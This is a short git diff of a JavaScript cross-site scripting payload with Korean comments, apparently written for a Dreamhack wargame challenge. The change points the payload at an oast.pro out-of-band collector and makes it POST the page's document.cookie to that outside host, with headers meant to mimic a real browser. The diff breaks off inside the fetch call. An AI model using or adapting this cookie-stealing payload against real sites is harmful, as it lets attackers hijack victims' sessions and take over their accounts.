@@ -1,10 +1,10 @@
 (async () => {
   // 유출할 URL (RequestBin 등)
-  const url = "https://tgdvefr.request.dreamhack.games/";
+  const url = "https://d0ngpqjz1wg0000afe4ggokammhyyyyyb.oast.pro";
 
   // FormData를 사용해 실제 브라우저의 POST 형태 흉내
   const data = new FormData();
-  data.append("info", "leak");
+  data.append("leak", document.cookie);
 
   // fetch를 사용하면서 실제 브라우저가 보낼법한 헤더 포함
   await fetch(url, {
